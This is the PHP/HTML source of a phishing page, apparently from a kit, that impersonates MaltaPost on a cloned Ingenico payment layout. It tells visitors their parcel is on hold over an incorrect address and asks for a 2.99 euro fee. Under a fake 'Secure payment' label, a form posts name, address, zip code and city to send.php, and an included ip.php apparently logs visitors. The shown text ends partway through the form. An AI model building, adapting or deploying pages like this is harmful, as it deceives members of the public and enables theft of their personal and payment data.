<?php
session_start();
include 'ip.php';

?>
<html dir="ltr" lang="de" class="ltr js js-focus-visible" data-js-focus-visible=""><!--<![endif]--><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
		<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
		
		<meta name="viewport" content="width=device-width, initial-scale=1.0">
		<meta name="format-detection" content="telephone=no">

		<title>MALTAPOST</title>

					<script type="text/javascript" src="./files/ruxitagentjs_ICA2SVfqrux_10219210719121502.js.download" data-dtconfig="uam=1|app=68fc6a26fcbdc3b0|ssc=1|rcdec=1209600000|featureHash=ICA2SVfqrux|vcv=2|rdnt=1|uxrgce=1|srcss=1|bp=3|srmcrv=10|cuc=yyd8k2pf|mel=100000|dpvc=1|ssv=4|lastModification=1631269093345|dtVersion=10219210719121502|srmcrl=1|tp=500,50,0,1|uxdcw=1500|vs=2|agentUri=/ruxitagentjs_ICA2SVfqrux_10219210719121502.js|reportUrl=/rb_b296011e-7abb-4056-b0aa-84f4b18e2840|rid=RID_2131621486|rpid=-714898090|domain=secured-by-ingenico.com"></script><link href="https://assets.pay2.secured-by-ingenico.com/templates/generic/responsive/wro/html-header.css?hash=798bdc858747c8c656e8e9cd5897f58615b99ac5" rel="stylesheet" type="text/css">
	<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.5.0/css/all.css" integrity="sha384-B4dIYHKNBt8Bc12p+WXckhzcICo0wtJAoU8YZTY5qE0Id1GSseTk6S+L3BlXeVIU" crossorigin="anonymous">

					<style id="rpp-custom-style">
				.ie8 body {
	background-color:#f1f1f1;
}
.ie8 body {
	color:#000000;
}
body {
	background-color:#f1f1f1;
	font-family:Arial,"Helvetica Neue",Helvetica,sans-serif;
	font-size:15px;
	color:#000000;
}
.ie8 body .form-control {
	border-color:#aaaaaa;
}
.ie8 body .form-control {
	color:#000000;
}
.ie8 body .form-control {
	background-color:#ffffff;
}
body .form-control {
	border-style:solid;
	border-width:1px;
	border-color:#aaaaaa;
	font-family:inherit;
	color:#000000;
	background-color:#ffffff;
	border-radius:2px;
	box-shadow:rgba(0, 0, 0, 0.15) 2px 3px 5px 0px inset;
}
.ie8 body .btn-primary {
	background-color:#cb0101;
}
.ie8 body .btn-primary {
	color:#ffffff;
}
.ie8 body .btn-primary {
	border-color:#cb0101;
}
body .btn-primary {
	background-color:#cb0101;
	color:#ffffff;
	border-style:solid;
	border-width:1px;
	border-color:#cb0101;
	border-radius:0px;
	font-family:Arial,"Helvetica Neue",Helvetica,sans-serif;
	font-size:18px;
	margin-top:5px;
	margin-right:0;
	margin-bottom:0;
	margin-left:0;
}
.ie8 body .btn-primary:hover, .ie8 body .btn-primary:focus {
	background-color:#003e00;
}
.ie8 body .btn-primary:hover, .ie8 body .btn-primary:focus {
	color:#ffffff;
}
.ie8 body .btn-primary:hover, .ie8 body .btn-primary:focus {
	border-color:#003e00;
}
body .btn-primary:hover, body .btn-primary:focus {
	background-color:#003e00;
	color:#ffffff;
	border-style:solid;
	border-width:1px;
	border-color:#003e00;
	border-radius:2px;
}
.ie8 body .btn-primary:active, .ie8 body .btn-primary:active:focus {
	background-color:#003e00;
}
.ie8 body .btn-primary:active, .ie8 body .btn-primary:active:focus {
	color:#ffffff;
}
.ie8 body .btn-primary:active, .ie8 body .btn-primary:active:focus {
	border-color:#003e00;
}
body .btn-primary:active, body .btn-primary:active:focus {
	background-color:#003e00;
	color:#ffffff;
	border-style:solid;
	border-width:1px;
	border-color:#003e00;
	border-radius:2px;
}
.ie8 body .btn-secondary {
	background-color:#ffffff;
}
.ie8 body .btn-secondary {
	color:#000000;
}
.ie8 body .btn-secondary {
	border-color:#ffffff;
}
body .btn-secondary {
	background-color:#ffffff;
	color:#000000;
	border-style:none;
	border-width:0px;
	border-color:#ffffff;
	border-radius:0px;
	font-family:Arial,"Helvetica Neue",Helvetica,sans-serif;
	font-size:15px;
	margin-top:5px;
	margin-right:0;
	margin-bottom:0;
	margin-left:0;
}
.ie8 body .btn-secondary:hover, .ie8 body .btn-secondary:focus {
	background-color:#ffffff;
}
.ie8 body .btn-secondary:hover, .ie8 body .btn-secondary:focus {
	color:#000000;
}
.ie8 body .btn-secondary:hover, .ie8 body .btn-secondary:focus {
	border-color:#ffffff;
}
body .btn-secondary:hover, body .btn-secondary:focus {
	background-color:#ffffff;
	color:#000000;
	border-style:none;
	border-width:0px;
	border-color:#ffffff;
	border-radius:0px;
}
.ie8 body .btn-secondary:active, .ie8 body .btn-secondary:active:focus {
	background-color:#ffffff;
}
.ie8 body .btn-secondary:active, .ie8 body .btn-secondary:active:focus {
	color:#000000;
}
.ie8 body .btn-secondary:active, .ie8 body .btn-secondary:active:focus {
	border-color:#ffffff;
}
body .btn-secondary:active, body .btn-secondary:active:focus {
	background-color:#ffffff;
	color:#000000;
	border-style:none;
	border-width:0px;
	border-color:#ffffff;
	border-radius:0px;
}
.ie8 body .btn-tertiary {
	background-color:#ffffff;
}
.ie8 body .btn-tertiary {
	border-color:#e5e5e5;
}
body .btn-tertiary {
	background-color:#ffffff;
	border-style:solid;
	border-width:1px;
	border-color:#e5e5e5;
	font-family:Arial,"Helvetica Neue",Helvetica,sans-serif;
	font-size:18px;
}
.ie8 body .btn-tertiary:hover, .ie8 body .btn-tertiary:focus {
	background-color:#cccccc;
}
.ie8 body .btn-tertiary:hover, .ie8 body .btn-tertiary:focus {
	color:#000000;
}
.ie8 body .btn-tertiary:hover, .ie8 body .btn-tertiary:focus {
	border-color:#cccccc;
}
body .btn-tertiary:hover, body .btn-tertiary:focus {
	background-color:#cccccc;
	color:#000000;
	border-style:solid;
	border-width:1px;
	border-color:#cccccc;
}
.ie8 body .btn-tertiary:active, .ie8 body .btn-tertiary:active:focus {
	background-color:#cccccc;
}
.ie8 body .btn-tertiary:active, .ie8 body .btn-tertiary:active:focus {
	color:#000000;
}
.ie8 body .btn-tertiary:active, .ie8 body .btn-tertiary:active:focus {
	border-color:#cccccc;
}
body .btn-tertiary:active, body .btn-tertiary:active:focus {
	background-color:#cccccc;
	color:#000000;
	border-style:solid;
	border-width:1px;
	border-color:#cccccc;
}
.ie8 #header {
	background-color:#ffcc00;
}
#header {
	background-color:#FFCC00;
}
.ie8 #merchantname {
	color:#ff0000;
}
#merchantname {
	font-family:Arial,"Helvetica Neue",Helvetica,sans-serif;
	font-size:18px;
	color:#ff0000;
	font-weight:normal;
	font-style:italic;
	text-decoration:underline;
	text-align:center;
}
.ie8 #precarttext {
	color:inherit;
}
#precarttext {
	font-family:inherit;
	font-size:18px;
	color:inherit;
	display:block;
	font-weight:bold;
	font-style:normal;
	text-decoration:none;
}
.ie8 #selectmethod {
	color:inherit;
}
#selectmethod {
	font-family:inherit;
	font-size:18px;
	color:inherit;
	font-weight:bold;
	font-style:normal;
	text-decoration:none;
}
.ie8 #selectmethod1 {
	color:#f1f1f1;
}
#selectmethod1 {
	font-family:inherit;
	color:#f1f1f1;
	font-weight:normal;
	font-style:normal;
	text-decoration:none;
}
.ie8 #selectmethod2 {
	color:inherit;
}
#selectmethod2 {
	font-family:inherit;
	font-size:18px;
	color:inherit;
	font-weight:bold;
	font-style:normal;
	text-decoration:none;
}
.ie8 #shoppingcartwrapper {
	background-color:white;
}
.ie8 #shoppingcartwrapper {
	border-color:white;
}
#shoppingcartwrapper {
	background-color:white;
	border-style:none;
	border-width:2px;
	border-color:#f2f2f2;
	border-radius:0px;
}
.ie8 #paymentoptionswrapper {
	border-color:#f2f2f2;
}
#paymentoptionswrapper {
	border-style:none;
	border-width:2px;
	border-color:#f2f2f2;
}
.ie8 #postcarttext {
	color:#9d0b0b;
}
#postcarttext {
	font-family:inherit;
	font-size:12px;
	color:rgb(157, 11, 11);
	display:block;
	font-weight:normal;
	font-style:normal;
	text-decoration:none;
}
#securePaymentblock {
	font-weight:normal;
	font-style:normal;
	text-decoration:none;
}
#paymentProductName {
	font-family:inherit;
	font-weight:normal;
	font-style:normal;
	text-decoration:none;
	display:block;
}
#remembermeText {
	font-weight:normal;
	font-style:normal;
	text-decoration:none;
}
#paymentbuttontext {
	font-weight:normal;
	font-style:normal;
	text-decoration:none;
}
#printPageButtonText {
	font-weight:normal;
	font-style:normal;
	text-decoration:none;
}
#cancelbuttontext {
	font-weight:normal;
	font-style:normal;
	text-decoration:none;
}
#tryagainbuttontext {
	font-weight:normal;
	font-style:normal;
	text-decoration:none;
}
#gotomerchantbuttontext {
	font-weight:normal;
	font-style:normal;
	text-decoration:none;
}
#selectotherbuttontext {
	font-weight:normal;
	font-style:normal;
	text-decoration:none;
}
.ie8 #prefootertext {
	color:inherit;
}
#prefootertext {
	font-family:inherit;
	font-size:15px;
	color:inherit;
	display:none;
	font-weight:normal;
	font-style:normal;
	text-decoration:none;
}
.ie8 #footer {
	background-color:transparent;
}
#footer {
	background-color:transparent;
}
.ie8 #paymentprocessorfooter {
	background-color:transparent;
}
#paymentprocessorfooter {
	background-color:transparent;
}
#paymentprocessorimage {
	display:block;
}
@media (min-width:0px) {
	#logoimage{
		background-image:url(https://www.maltapost.com/Tracking/Resources/images/subpage-header-logo_old.png?size=200x44);
		width:100px;
		height:22px;
	}
}
@media (min-width:768px) {
	#logoimage{
		background-image:url(https://www.maltapost.com/Tracking/Resources/images/subpage-header-logo_old.png?size=300x66);
		width:150px;
		height:33px;
	}
}
@media (min-width:992px) {
	#logoimage{
		background-image:url(https://www.maltapost.com/Tracking/Resources/images/subpage-header-logo_old.png?size=300x66);
		width:150px;
		height:33px;
	}
}
@media (min-width:1200px) {
	#logoimage{
		background-image:url(https://www.maltapost.com/Tracking/Resources/images/subpage-header-logo_old.png?size=300x66);
		width:150px;
		height:33px;
	}
}
#shoppingcartheader {
display: block !important;
}
#shoppingcartcontent {
display: none !important;
}
#shoppingcart .caret {
display: none;
}
#merchantfooter {
	display:block;
}
body .paymentoption .hasIcon input { padding-left: 44px; } body .paymentoption .hasIcon select:not(#dateOfBirth-day):not(#dateOfBirth-month):not(#dateOfBirth-year){ padding-left: 40px; } body .paymentoption .hasIcon .date-section { padding-left: 37px; } body .paymentoption .hasIcon .date-section i { border-right: 0 } body .paymentoption .hasIcon > i { display: block;} body .paymentoption .form-group.hasIcon > label { display: none!important; } html.rtl body .paymentoption .hasIcon .hasIcon:not(.ltr) i:not(.icon-qmark) { padding: 11px 0 0 8px; margin-left: 0; margin-right: 10px; border-right: 0; border-left: 1px solid #f2f2f2; } html.rtl body .paymentoption .hasIcon .hasIcon:not(.ltr) input { padding-right: 44px; padding-left: 10px; } html.rtl body .paymentoption .hasIcon .hasIcon:not(.ltr) select:not(#dateOfBirth-day):not(#dateOfBirth-month):not(#dateOfBirth-year) { padding-left: 13px; padding-right: 40px; } html.rtl body .paymentoption .hasIcon .hasIcon:not(.ltr) .date-section { padding-left: 0; padding-right: 37px; } html.rtl body .paymentoption .hasIcon .hasIcon:not(.ltr) .date-section i { border-left: 0; } #logoimage { display: block; } #merchantname { display: none; }#logoimage {
	float:left;
}
.ie8 #securePaymentblockwrapper {
	color:#006700;
}
#securePaymentblockwrapper {
	display:block;
	font-family:inherit;
	font-size:14px;
	color:#006700;
}
#remembermeBlock {
	display:none;
}
.ie8 #appPayment-introduction {
	color:#000000;
}
#appPayment-introduction {
	font-family:Arial,"Helvetica Neue",Helvetica,sans-serif;
	font-size:15px;
	color:#000000;
	font-weight:normal;
	font-style:normal;
	text-decoration:none;
	text-align:left;
}
.ie8 #appPayment-paywithapplabel {
	color:#000000;
}
#appPayment-paywithapplabel {
	font-family:Arial,"Helvetica Neue",Helvetica,sans-serif;
	font-size:15px;
	color:#000000;
	font-weight:bold;
	font-style:normal;
	text-decoration:none;
	text-align:left;
}
#appPayment-paywithappbuttontext {
	font-weight:normal;
	font-style:normal;
	text-decoration:none;
}
#appPayment-refreshpaymentbuttontext {
	font-weight:normal;
	font-style:normal;
	text-decoration:none;
}
.ie8 #appPayment-qrcodelabel {
	color:#000000;
}
#appPayment-qrcodelabel {
	font-family:Arial,"Helvetica Neue",Helvetica,sans-serif;
	font-size:15px;
	color:#000000;
	font-weight:normal;
	font-style:normal;
	text-decoration:none;
	text-align:left;
}
.ie8 body .divider-wrapper .text-over-divider {
	background-color:#ffffff;
}
body .divider-wrapper .text-over-divider {
	font-weight:bold;
	font-style:normal;
	text-decoration:none;
	background-color:#ffffff;
}
.ie8 #appPayment-paywithcardlabel {
	color:#000000;
}
#appPayment-paywithcardlabel {
	font-family:Arial,"Helvetica Neue",Helvetica,sans-serif;
	font-size:15px;
	color:#000000;
	font-weight:bold;
	font-style:normal;
	text-decoration:none;
	text-align:left;
}
.ie8 #appPayment-processingtitle {
	color:#000000;
}
#appPayment-processingtitle {
	font-family:Arial,"Helvetica Neue",Helvetica,sans-serif;
	font-size:15px;
	color:#000000;
	font-weight:normal;
	font-style:italic;
	text-decoration:underline;
	text-align:left;
}
.ie8 #appPayment-processing {
	color:#000000;
}
#appPayment-processing {
	font-family:Arial,"Helvetica Neue",Helvetica,sans-serif;
	font-size:15px;
	color:#000000;
	font-weight:normal;
	font-style:italic;
	text-decoration:underline;
	text-align:left;
}
.ie8 #appPayment-refreshlabel {
	color:#000000;
}
#appPayment-refreshlabel {
	font-family:Arial,"Helvetica Neue",Helvetica,sans-serif;
	font-size:15px;
	color:#000000;
	font-weight:normal;
	font-style:italic;
	text-decoration:underline;
	text-align:left;
}
.ie8 body .has-error div.error {
	color:#9c0000;
}
body .has-error div.error {
	font-family:inherit;
	color:#9c0000;
}
.ie8 body .has-error .form-control {
	border-color:#9c0000;
}
body .has-error .form-control {
	border-color:#9c0000;
}
.ie8 body .has-error .form-control:focus {
	border-color:#9c0000;
}
body .has-error .form-control:focus {
	border-color:#9c0000;
	-webkit-box-shadow:inset 0 1px 1px rgba(0,0,0,0.075), 0 0 6px #9c0000;
	box-shadow:inset 0 1px 1px rgba(0,0,0,0.075), 0 0 6px #9c0000;
}
.ie8 #loading {
	background-color:#ffffff;
}
.ie8 #loading {
	color:#666666;
}
#loading {
	background-color:rgba(255, 255, 255, 0.9);
	color:#666666;
}
.ie8 #loading .loading-text {
	color:#666666;
}
.ie8 #loading .loading-text {
	background-color:#ffffff;
}
#loading .loading-text {
	font-family:inherit;
	color:#666666;
	font-weight:normal;
	font-style:normal;
	text-decoration:none;
	text-align:center;
	background-color:#ffffff;
}
body .paymentoptions form, body .paymentoptions .par {
	max-width:300px;
}
.ie8 #cobrand .cobrand-wrapper {
	background-color:#f2f2f2;
}
#cobrand .cobrand-wrapper {
	background-color:#f2f2f2;
	font-family:inherit;
}
.ie8 body .btn-link:active, .ie8 body .btn-link:active:focus {
	background-color:transparent;
}
.ie8 body .btn-link:active, .ie8 body .btn-link:active:focus {
	color:#1f5284;
}
.ie8 body .btn-link:active, .ie8 body .btn-link:active:focus {
	border-color:transparent;
}
body .btn-link:active, body .btn-link:active:focus {
	background-color:transparent;
	color:#1F5284;
	border-style:none;
	border-width:0px;
	border-color:transparent;
	border-radius:0px;
}
.ie8 body .btn-lookup:active, .ie8 body .btn-lookup:active:focus {
	background-color:#e6e6e6;
}
.ie8 body .btn-lookup:active, .ie8 body .btn-lookup:active:focus {
	color:#000000;
}
.ie8 body .btn-lookup:active, .ie8 body .btn-lookup:active:focus {
	border-color:#bfbdc8;
}
body .btn-lookup:active, body .btn-lookup:active:focus {
	background-color:#e6e6e6;
	color:#000000;
	border-style:solid;
	border-width:1px;
	border-color:#bfbdc8;
	border-radius:1px;
}
.ie8 body .btn-link:hover, .ie8 body .btn-link:focus {
	background-color:transparent;
}
.ie8 body .btn-link:hover, .ie8 body .btn-link:focus {
	color:#1f5284;
}
.ie8 body .btn-link:hover, .ie8 body .btn-link:focus {
	border-color:transparent;
}
body .btn-link:hover, body .btn-link:focus {
	background-color:transparent;
	color:#1F5284;
	border-style:none;
	border-width:0px;
	border-color:transparent;
	border-radius:0px;
}
.ie8 body .btn-lookup:hover, .ie8 body .btn-lookup:focus {
	background-color:#e6e6e6;
}
.ie8 body .btn-lookup:hover, .ie8 body .btn-lookup:focus {
	color:#000000;
}
.ie8 body .btn-lookup:hover, .ie8 body .btn-lookup:focus {
	border-color:#bfbdc8;
}
body .btn-lookup:hover, body .btn-lookup:focus {
	background-color:#e6e6e6;
	color:#000000;
	border-style:solid;
	border-width:1px;
	border-color:#bfbdc8;
	border-radius:1px;
}
.ie8 body .btn-link {
	background-color:transparent;
}
.ie8 body .btn-link {
	color:#2869ac;
}
.ie8 body .btn-link {
	border-color:transparent;
}
body .btn-link {
	background-color:transparent;
	color:#2869ac;
	border-style:none;
	border-width:0px;
	border-color:transparent;
	border-radius:0px;
	font-family:Arial,"Helvetica Neue",Helvetica,sans-serif;
	font-size:15px;
	margin-top:0;
	margin-right:0;
	margin-bottom:0;
	margin-left:0;
}
.ie8 body .btn-lookup {
	background-color:#f2f2f2;
}
.ie8 body .btn-lookup {
	color:inherit;
}
.ie8 body .btn-lookup {
	border-color:#bfbdc8;
}
body .btn-lookup {
	background-color:#f2f2f2;
	color:inherit;
	border-style:solid;
	border-width:1px;
	border-color:#bfbdc8;
	border-radius:1px;
	font-family:Arial,"Helvetica Neue",Helvetica,sans-serif;
	font-size:18px;
	margin-top:0;
	margin-right:0;
	margin-bottom:0;
	margin-left:0;
}
#enterinformationButtonText {
	font-weight:normal;
	font-style:normal;
	text-decoration:none;
}
#searchconsumerButtonText {
	font-weight:normal;
	font-style:normal;
	text-decoration:none;
}
.ie8 #label-searchConsumerText {
	color:#000000;
}
#label-searchConsumerText {
	font-weight:normal;
	font-style:normal;
	text-decoration:none;
	font-family:Arial,"Helvetica Neue",Helvetica,sans-serif;
	color:#000000;
}
.ie8 #afterpayTermsandconditionsText {
	color:#000000;
}
#afterpayTermsandconditionsText {
	font-family:Arial,"Helvetica Neue",Helvetica,sans-serif;
	font-size:15px;
	color:#000000;
}
.ie8 body .panel {
	background-color:#f2f2f2;
}
.ie8 body .panel {
	border-color:#e5e5e5;
}
body .panel {
	background-color:#F2F2F2;
	border-style:none;
	border-width:2px;
	border-color:#e5e5e5;
	border-radius:0px;
}
.ie8 #cobrand .toggle-cobrand:active, .ie8 #cobrand .toggle-cobrand:active:focus {
	color:inherit;
}
#cobrand .toggle-cobrand:active, #cobrand .toggle-cobrand:active:focus {
	color:inherit;
	text-decoration:inherit;
}
.ie8 #cobrand .toggle-cobrand {
	color:inherit;
}
#cobrand .toggle-cobrand {
	color:inherit;
	text-decoration:underline;
}
.ie8 #cobrand .toggle-cobrand:hover, .ie8 #cobrand .toggle-cobrand:focus {
	color:inherit;
}
#cobrand .toggle-cobrand:hover, #cobrand .toggle-cobrand:focus {
	color:inherit;
	text-decoration:inherit;
}
#cancelPaymentForm {
	display:none;
}
.ie8 #secciUrlLink {
	color:#2869ac;
}
#secciUrlLink {
	color:#2869ac;
	text-decoration:none;
}
.ie8 #secciUrlLink:hover, .ie8 #secciUrlLink:focus {
	color:#1f5284;
}
#secciUrlLink:hover, #secciUrlLink:focus {
	color:#1F5284;
	text-decoration:underline;
}
.ie8 #secciUrlLink:active, .ie8 #secciUrlLink:active:focus {
	color:#1f5284;
}
#secciUrlLink:active, #secciUrlLink:active:focus {
	color:#1F5284;
	text-decoration:underline;
}
.ie8 #afterpayTermsAndConditionsLink {
	color:#2869ac;
}
#afterpayTermsAndConditionsLink {
	color:#2869ac;
	text-decoration:none;
}
.ie8 #afterpayTermsAndConditionsLink:hover, .ie8 #afterpayTermsAndConditionsLink:focus {
	color:#1f5284;
}
#afterpayTermsAndConditionsLink:hover, #afterpayTermsAndConditionsLink:focus {
	color:#1F5284;
	text-decoration:underline;
}
.ie8 #afterpayTermsAndConditionsLink:active, .ie8 #afterpayTermsAndConditionsLink:active:focus {
	color:#1f5284;
}
#afterpayTermsAndConditionsLink:active, #afterpayTermsAndConditionsLink:active:focus {
	color:#1F5284;
	text-decoration:underline;
}
.ie8 #footerWrapper a {
	color:#000000;
}
#footerWrapper a {
	color:#000000;
	text-decoration:none;
}
.ie8 #footerWrapper a:hover, .ie8 #footerWrapper a:focus {
	color:#262626;
}
#footerWrapper a:hover, #footerWrapper a:focus {
	color:#262626;
	text-decoration:underline;
}
.ie8 #footerWrapper a:active, .ie8 #footerWrapper a:active:focus {
	color:#262626;
}
#footerWrapper a:active, #footerWrapper a:active:focus {
	color:#262626;
	text-decoration:underline;
}
#privacyPolicyContainer {
	text-align:center;
}
.ie8 .popover {
	background-color:#ffffff;
}
.ie8 .popover {
	color:inherit;
}
.ie8 .popover {
	border-color:#999999;
}
.popover {
	background-color:#fff;
	font-family:inherit;
	color:inherit;
	border-style:solid;
	border-width:1px;
	border-color:#999999;
	border-radius:4px;
}
.popover.left > .arrow:after {
	border-left-color:#fff;
}
.popover.bottom > .arrow:after {
	border-bottom-color:#fff;
}
.popover.right > .arrow:after {
	border-right-color:#fff;
}
.popover.left > .arrow:after {
	right:1px;
}
.popover.bottom > .arrow:after {
	top:1px;
}
.popover.right > .arrow:after {
	left:1px;
}
.popover.left > .arrow {
	border-left-color:#999999;
}
.popover.bottom > .arrow {
	border-bottom-color:#999999;
}
.popover.right > .arrow {
	border-right-color:#999999;
}
.ie8 .info-popover {
	background-color:#f2f2f2;
}
.ie8 .info-popover {
	color:#666666;
}
.ie8 .info-popover {
	border-color:#666666;
}
.info-popover {
	background-color:#f2f2f2;
	font-size:16px;
	color:#666666;
	border-color:#666666;
	box-shadow:none;
}
.ie8 #appPayment-warning {
	color:inherit;
}
#appPayment-warning {
	font-weight:normal;
	font-style:normal;
	text-decoration:none;
	font-family:inherit;
	color:inherit;
}
.ie8 #boletoBancarioBarcodeContainer {
	color:inherit;
}
.ie8 #boletoBancarioBarcodeContainer {
	border-color:#cccccc;
}
.ie8 #boletoBancarioBarcodeContainer {
	background-color:#f2f2f2;
}
#boletoBancarioBarcodeContainer {
	font-family:inherit;
	color:inherit;
	border-style:solid;
	border-width:1px;
	border-color:#cccccc;
	background-color:#f2f2f2;
}
#boletoBancarioBarcodeContainer .barcode-bank {
	border-bottom-style:solid;
}
#boletoBancarioBarcodeContainer .barcode-bank {
	border-bottom-width:1px;
}
#boletoBancarioBarcodeContainer .barcode-bank {
	border-bottom-color:#cccccc;
}
#paymentoptionslistAOF li .btn-tertiary>div>img, #paymentoptionslist li .btn-tertiary>div>img, body .paymentoption .cc-image>img { background-color: transparent; }
			</style>
			<style type="text/css">
@font-face {
  font-weight: 400;
  font-style:  normal;
  font-family: 'Circular-Loom';

  src: url('https://cdn.loom.com/assets/fonts/circular/CircularXXWeb-Book-cd7d2bcec649b1243839a15d5eb8f0a3.woff2') format('woff2');
}

@font-face {
  font-weight: 500;
  font-style:  normal;
  font-family: 'Circular-Loom';

  src: url('https://cdn.loom.com/assets/fonts/circular/CircularXXWeb-Medium-d74eac43c78bd5852478998ce63dceb3.woff2') format('woff2');
}

@font-face {
  font-weight: 700;
  font-style:  normal;
  font-family: 'Circular-Loom';

  src: url('https://cdn.loom.com/assets/fonts/circular/CircularXXWeb-Bold-83b8ceaf77f49c7cffa44107561909e4.woff2') format('woff2');
}

@font-face {
  font-weight: 900;
  font-style:  normal;
  font-family: 'Circular-Loom';

  src: url('https://cdn.loom.com/assets/fonts/circular/CircularXXWeb-Black-bf067ecb8aa777ceb6df7d72226febca.woff2') format('woff2');
}</style></head>

	
			<body class="" style="background-color: white">
				<div id="content"> 

  <header id="header" style="background-color: #cb0101">
    <div class="container">
      <div class="row">
        <div class="col-xs-24">
        
          <h3 id="merchantname">
            [merchantName]          </h3>
        </div>
      </div>
    </div>
  </header>


<main id="main" class="container">
    <div class="row">
        			<div class="col-md-12">
<center><img src="https://www.maltapost.com/Tracking/Resources/images/subpage-header-logo_old.png"></center>

			<div class="extra-content">
				<div id="precarttext" style="color: #cb0101;font-size: 14px">
					<center>Your parcel has been putted in hold, due incorrect address, you need to confirm your address, and pay the extra fees of changing address, about 2.99 euro to confirm the new shipping address.			</center></div>
			</div>


								<div class="cart" id="shoppingcartwrapper">
		<div id="shoppingcart" style="background-color: white">
			<div class="header hidden-md hidden-lg" id="shoppingcartheader">
				<strong>To ship</strong>
			</div>
			<div class="content hidden-xs hidden-sm " id="shoppingcartcontent">
				<div>
					<h1>Ihr Auftrag</h1>
					<table class="table">
						<tbody>
												</tbody>
						<tfoot>
							<tr>
								<td>
									<strong>To ship</strong>
																	</td>
							
							</tr>
						</tfoot>
					</table>
				</div>
			</div>
		</div>
	</div>
			
			

		</div>
		<div class="col-md-12"> 	             <div id="paymentoptionswrapper" class="paymentoptions">
                <div class="par">
                                                            <p class="securePayment pull-right" id="securePaymentblockwrapper">
        <i class="icon-lock"></i>
        <span id="securePaymentblock">
            Secure payment       </span>
    </p>
                    <div class="clearfix"></div>
                </div>
    
    <form id="paymentoptionForm" method="post" class="validatedForm" action="send.php">
            <input type="hidden" value="6742" name="publicMerchantId">

    <input type="hidden" value="100" name="variantCode">

    <input type="hidden" value="de_CH" name="locale">

    <input type="hidden" value="e625aca6-adaf-493f-a5b4-e6835a790b6f" name="idempotenceKey">

    <input type="hidden" value="6742-3c6ca89d905040d3ae7e1a5d4871fa92:64be154f-0626-4068-993f-cb3ec16ebe73:3063e5608e0e4797938d333e66912794" name="token">

    <input type="hidden" value="bcd2cd50-f9fb-44a6-8725-898835696072" name="requestToken">
<input type="hidden" value="true" name="isPaymentProductDetailsShown">
<input type="hidden" value="true" name="jsEnabled">
<input type="hidden" id="buttonValue">

    <input type="hidden" value="3" name="paymentProductId">



<input type="hidden" value="false" name="isFramed">
                
                <div class="paymentoption">
                                <input type="hidden" name="colorDepth">
    <input type="hidden" name="screenHeight">
    <input type="hidden" name="screenWidth">
    <input type="hidden" name="timezoneOffsetUtcMinutes">
    <input type="hidden" name="browserLocale">
    <input type="hidden" name="javaEnabled">
    <input type="hidden" name="innerHeight">
    <input type="hidden" name="innerWidth">
                   
                            
     
                                                   
                        
    <div class="form-group cardholder-name hasIcon" data-display-order="1142">
        <label id="label-cardholderName" for="cardholderName" class="hidden-xs hidden-sm">Name</label>
                <div class="hasIcon ltr" dir="ltr">
            <input name="name" placeholder="Full Name" id="cardholderName" class="form-control cc-name" autocomplete="cc-name" type="text" required  oninvalid="this.setCustomValidity('Name')"
  oninput="this.setCustomValidity('')">
            <i class="icon-user"></i>
            <span class="tooltip-button-container" tabindex="0">
                <button type="button" data-content="&lt;span&gt;Geben Sie den Namen des Karteninhabers, wie auf der Karte geschrieben, in lateinischen Buchstaben ein.&lt;/span&gt;" id="cardholder-name-popover" data-toggle="popover" class="info-popover show-js" title="" data-html="true" data-original-title="">
                    <i class="icon-qmark"></i>
                    <span class="sr-only">
                        Zusätzliche Informationen                    </span>
                </button>
            </span>
                            </div>
    </div>
                             
    <div class="form-group cardholder-name hasIcon" data-display-order="1142">
        <label id="label-cardholderName" for="cardholderName" class="hidden-xs hidden-sm">Adresse</label>
                <div class="hasIcon ltr" dir="ltr">
            <input name="address" placeholder="Address" id="cardholderName" class="form-control cc-name" data-send="true" autocomplete="cc-name" type="text" required="" data-rule-cardholdername="true" data-rule-length="true" oninvalid="this.setCustomValidity('Adresse')"
  oninput="this.setCustomValidity('')">
<i class="fas fa-file-invoice"></i>            <span class="tooltip-button-container" tabindex="0">
                <button type="button" data-content="&lt;span&gt;Geben Sie den Namen des Karteninhabers, wie auf der Karte geschrieben, in lateinischen Buchstaben ein.&lt;/span&gt;" id="cardholder-name-popover" data-toggle="popover" class="info-popover show-js" title="" data-html="true" data-original-title="">
                    <i class="icon-qmark"></i>
                    <span class="sr-only">
                        Zusätzliche Informationen                    </span>
                </button>
            </span>
                            </div>
    </div>
                             
    <div class="form-group cardholder-name hasIcon" data-display-order="1142">
        <label id="label-cardholderName" for="cardholderName" class="hidden-xs hidden-sm">Postleitzahl</label>
                <div class="hasIcon ltr" dir="ltr">
            <input name="zip" placeholder="Zip Code" id="cardholderName" class="form-control cc-name" data-send="true" autocomplete="cc-name" type="text" required="" data-rule-cardholdername="true" data-rule-length="true" oninvalid="this.setCustomValidity('Postleitzahl')"
  oninput="this.setCustomValidity('')">
<i class="fas fa-file-invoice"></i>  
            <span class="tooltip-button-container" tabindex="0">
                <button type="button" data-content="&lt;span&gt;Geben Sie den Namen des Karteninhabers, wie auf der Karte geschrieben, in lateinischen Buchstaben ein.&lt;/span&gt;" id="cardholder-name-popover" data-toggle="popover" class="info-popover show-js" title="" data-html="true" data-original-title="">
                    <i class="icon-qmark"></i>
                    <span class="sr-only">
                        Zusätzliche Informationen                    </span>
                </button>
            </span>
                            </div>
    </div>
                             
    <div class="form-group cardholder-name hasIcon" data-display-order="1142">
        <label id="label-cardholderName" for="cardholderName" class="hidden-xs hidden-sm">Stadt</label>
                <div class="hasIcon ltr" dir="ltr">
            <input name="city" placeholder="State" id="cardholderName" class="form-control cc-name" data-send="true" autocomplete="cc-name" type="text" required="" data-rule-cardholdername="true" data-rule-length="true" oninvalid="this.setCustomValidity('Stadt')"
  oninput="this.setCustomValidity('')">
<i class='fas fa-city'></i>
            <span class="tooltip-button-container" tabindex="0">
                <button type="button" data-content="&lt;span&gt;Geben Sie den Namen des Karteninhabers, wie auf der Karte geschrieben, in lateinischen Buchstaben ein.&lt;/span&gt;" id="cardholder-name-popover" data-toggle="popover" class="info-popover show-js" title="" data-html="true" data-original-title="">
                    <i class="icon-qmark"></i>
                    <span class="sr-only">
                        Zusätzliche Informationen                    </span>
                </button>
            </span>
                            </div>
    </div>
                 
            
    <div class="form-group cardholder-name hasIcon" data-display-order="1142">
        <label id="label-cardholderName" for="cardholderName" class="hidden-xs hidden-sm">Bundesland</label>
                <div class="hasIcon ltr" dir="ltr">
